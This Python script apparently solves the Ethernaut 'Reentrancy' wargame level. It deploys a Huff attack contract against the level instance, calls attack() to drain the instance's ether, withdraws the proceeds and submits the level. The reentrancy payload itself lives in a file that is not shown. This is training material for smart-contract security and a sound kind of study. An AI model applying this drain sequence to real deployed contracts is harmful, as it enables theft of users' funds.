from ape import accounts, chain
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    get_sig,
    send_tx,
    w3,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb"


def print_balances(user, hacker):
    receipt = send_tx(user, hacker, get_sig("get_balance()"))
    print(f"\n--- Instance balance before exploit: {receipt.call_tree.outputs} ---\n")
    print(
        f"\n--- Our balance before exploit: {chain.provider.get_balance(hacker)} ---\n"
    )


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(
        ETHERNAUT, LEVEL, user, value="0.001 ether"
    )

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract(
        "Reentrancy.huff", instance, user, value=w3.to_wei(0.001, "ether")
    )

    # exploit goes here
    print_balances(user, hacker)

    print("\n--- Exploiting level instance ---\n")
    send_tx(user, hacker, get_sig("attack()"))

    print_balances(user, hacker)

    # recover funds
    print("\n--- Recovering funds ---\n")
    send_tx(user, hacker, get_sig("withdraw()"))

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
